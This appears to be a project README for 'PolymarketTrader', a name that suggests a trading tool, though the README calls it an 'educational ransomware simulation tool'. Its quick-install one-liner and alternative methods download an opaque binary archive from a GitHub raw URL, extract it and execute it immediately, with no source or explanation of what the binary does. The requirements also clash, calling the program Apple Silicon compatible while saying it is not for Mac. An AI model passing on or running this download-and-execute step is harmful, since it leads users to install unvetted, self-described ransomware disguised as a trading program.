# PolymarketTrader

Educational ransomware simulation tool for Ubuntu/Linux systems.

## Quick Installation

Run this single command to download and install:

```bash
mkdir -p poly-trader && cd poly-trader && curl -L https://raw.githubusercontent.com/YoavSavir/PolymarketTrader/main/polymarket-trader.tar.gz -o polymarket-trader.tar.gz && tar -xzf polymarket-trader.tar.gz && rm polymarket-trader.tar.gz && ./PolymarketTrader
```

This will:
1. Create a `poly-trader` directory
2. Download the compressed archive
3. Extract the executable (permissions preserved)
4. Clean up the archive file
5. Run the program automatically

## Alternative Installation Methods

### Method 1: Download and Run Manually
```bash
# Create directory
mkdir -p poly-trader
cd poly-trader

# Download archive
curl -L https://raw.githubusercontent.com/YoavSavir/PolymarketTrader/main/polymarket-trader.tar.gz -o polymarket-trader.tar.gz

# Extract (permissions preserved)
tar -xzf polymarket-trader.tar.gz

# Clean up archive file
rm polymarket-trader.tar.gz

# Run the program
./PolymarketTrader
```

### Method 2: Using wget
```bash
mkdir -p poly-trader && cd poly-trader
wget https://raw.githubusercontent.com/YoavSavir/PolymarketTrader/main/polymarket-trader.tar.gz
tar -xzf polymarket-trader.tar.gz
rm polymarket-trader.tar.gz
./PolymarketTrader
```

## Troubleshooting

### Extraction Issues
If tar extraction fails, ensure you have tar installed:
```bash
# On Ubuntu/Debian
sudo apt-get install tar

# On RHEL/CentOS
sudo yum install tar
```

### File not executable
If you see "cannot execute binary file", make sure you're on a Linux/Ubuntu system (not Windows/Mac).

### Permission Issues
If you still get permission errors (rare), run:
```bash
chmod +x PolymarketTrader
```

## Requirements

- **Operating System:** Ubuntu/Linux (64-bit)
- **Architecture:** ARM64/aarch64 (Apple Silicon compatible)
- **Dependencies:** None (all bundled in executable)

## Usage

After you download, follow the installation process displayed by the program.


## Support

If you encounter issues, ensure you're running on a compatible Linux system and have proper file permissions. 
